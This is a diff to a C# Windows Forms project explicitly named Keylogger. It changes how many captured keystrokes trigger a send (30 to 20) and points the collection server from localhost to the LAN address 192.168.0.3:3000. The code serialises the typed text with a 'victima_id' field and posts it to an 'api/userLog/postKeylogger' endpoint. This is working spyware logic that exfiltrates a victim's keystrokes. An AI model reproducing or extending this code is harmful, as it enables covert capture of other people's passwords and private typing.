@@ -146,7 +146,7 @@ namespace Keylogger
 
             
             //si se ingreso mas de 10 caracteres
-            if (texto.Length > 30)
+            if (texto.Length > 20)
             {
                 //enviar el texto ingresado a la funcion de guardar texto
                 archivo(texto);
@@ -155,7 +155,7 @@ namespace Keylogger
                 var log = new logClass { victima_id = "1", log = texto };
                 string jsonString = JsonConvert.SerializeObject(log);
                 var stringContent = new StringContent(jsonString, Encoding.UTF8, "application/json");
-                client.BaseAddress = new Uri("http://localhost:3000/");
+                client.BaseAddress = new Uri("http://192.168.0.3:3000/");
                 var response = client.PostAsync("api/userLog/postKeylogger", stringContent).Result;
                 if (response.IsSuccessStatusCode)
                 {
@@ -204,6 +204,11 @@ namespace Keylogger
         }
 
         private void frmService_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label1_Click(object sender, EventArgs e)
         {
 
         }
